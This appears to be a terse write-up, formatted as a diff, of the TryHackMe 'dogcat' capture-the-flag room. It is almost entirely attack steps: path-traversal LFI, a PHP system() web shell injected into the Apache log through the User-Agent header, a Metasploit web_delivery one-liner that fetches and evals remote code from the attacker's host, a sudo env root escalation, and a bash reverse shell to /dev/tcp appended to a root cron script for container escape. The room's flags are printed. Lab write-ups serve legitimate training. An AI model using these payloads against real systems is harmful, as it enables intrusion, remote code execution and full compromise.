@@ -1,0 +1,92 @@
+dogcat
+
+I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.
+
+ping 10.10.154.84 
+nmap -Pn -sV -sC -vv -p- 10.10.154.84 
+
+80,22
+
+http://10.10.154.84/?view=../../../../../../../../etc/passwd
+ Sorry, only dogs or cats are allowed. 
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers
+
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+
+http://10.10.154.84/?view=php://filter/convert.base64-encode/resource=dog
+
+http://10.10.154.84/?view=dog/../../../../../../../etc/passwd&ext=
+
+http://10.10.154.84/?view=dog/../../../../../../../var/log/apache2/access.log&ext=
+
+Open Burp
+intercept.
+User-Agent: <?php system($_GET['c']); ?>
+
+check Log
+
+http://10.10.154.84/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=whoami
+
+CRTL+F 
+
+www-data
+
+use exploit/multi/script/web_delivery
+show targets
+set target 1
+set lhost 10.11.9.12
+set srvport 8081
+set payload php/meterpreter/reverse_tcp
+exploit
+
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.11.9.12:8081/JDGiCDIs', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+
+http://10.10.154.84/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.11.9.12:8081/JDGiCDIs', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+
+
+meterpreter > search -f flag.php
+meterpreter > cat flag.php
+
+THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
+
+meterpreter > cd ..
+meterpreter > cat flag2_QMW7JvaY2LvK.txt
+
+THM{LF1_t0_RC3_aec3fb}
+
+meterpreter > shell
+
+/bin/sh -i
+export TERM=xterm
+
+sudo -l
+
+    (root) NOPASSWD: /usr/bin/env
+
+https://gtfobins.github.io/gtfobins/env/
+
+sudo env /bin/sh
+cd /root
+cat flag3.txt
+
+THM{D1ff3r3nt_3nv1ronments_874112}
+
+cd /
+ls -la
+cd /opt
+ls
+cd backups
+ls
+cat backup.sh
+
+echo "/bin/bash -c 'bash -i >& /dev/tcp/10.11.9.12/1234 0>&1'" >> backup.sh
+
+nc -lvnp 1234
+
+WAIT ...
+
+root@dogcat:~# cat flag4.txt 
+
+THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
+
